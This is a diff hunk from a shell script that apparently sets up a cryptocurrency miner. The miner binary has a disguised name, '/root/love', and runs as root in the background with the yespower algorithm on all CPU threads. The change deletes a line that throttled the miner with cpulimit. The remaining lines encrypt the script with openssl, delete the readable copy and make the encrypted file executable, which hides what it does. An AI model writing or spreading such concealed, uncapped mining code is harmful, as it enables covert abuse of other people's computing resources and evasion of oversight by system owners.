@@ -40,7 +40,6 @@ sleep 3
 sudo /root/love --background --threads=$cores -a yespower -c config.json
 sleep 3
 EOF
-sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof love) > /dev/null 2>&1 &" danielluis1921.sh
 openssl enc -aes-256-cbc -salt -pbkdf2 -in danielluis1921.sh -out danielluis1922.sh -k $password
 rm -fv danielluis1921.sh
 chmod +x /root/danielluis1922.sh
